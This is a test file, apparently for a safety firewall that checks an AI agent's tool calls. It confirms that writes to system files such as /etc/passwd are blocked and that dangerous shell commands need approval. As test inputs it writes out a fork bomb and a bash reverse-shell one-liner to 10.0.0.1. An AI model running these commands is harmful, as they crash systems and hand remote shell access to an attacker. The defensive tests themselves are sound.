import { describe, expect, it } from "vitest";
import {
	type ActionApprovalContext,
	ActionFirewall,
	defaultActionFirewall,
} from "../../src/safety/action-firewall.js";

function makeWriteContext(path: string): ActionApprovalContext {
	return { toolName: "write", args: { path } };
}

function makeBashContext(command: string): ActionApprovalContext {
	return { toolName: "bash", args: { command } };
}

describe("ActionFirewall - Blocking Rules", () => {
	it("blocks modification of critical system directories", async () => {
		const verdict = await defaultActionFirewall.evaluate(
			makeWriteContext("/etc/passwd"),
		);
		expect(verdict.action).toBe("block");
		expect(verdict).toMatchObject({
			ruleId: "system-path-protection",
		});
	});

	if (process.platform === "win32") {
		it("blocks modification of critical system directories (windows style)", async () => {
			const verdict = await defaultActionFirewall.evaluate(
				makeWriteContext("C:\\Windows\\System32\\drivers\\etc\\hosts"),
			);
			expect(verdict.action).toBe("block");
			expect(verdict).toMatchObject({
				ruleId: "system-path-protection",
			});
		});
	}

	it("requires approval for dangerous patterns (fork bomb)", async () => {
		const verdict = await defaultActionFirewall.evaluate(
			makeBashContext(":(){ :|:& };:"),
		);
		expect(verdict.action).toBe("require_approval");
		expect(verdict).toMatchObject({
			ruleId: "command-forkBomb",
		});
	});

	it("requires approval for dangerous patterns (reverse shell)", async () => {
		const verdict = await defaultActionFirewall.evaluate(
			makeBashContext("bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"),
		);
		expect(verdict.action).toBe("require_approval");
		// Matches bashReverse first
		expect(verdict).toMatchObject({
			ruleId: "command-bashReverse",
		});
	});
});
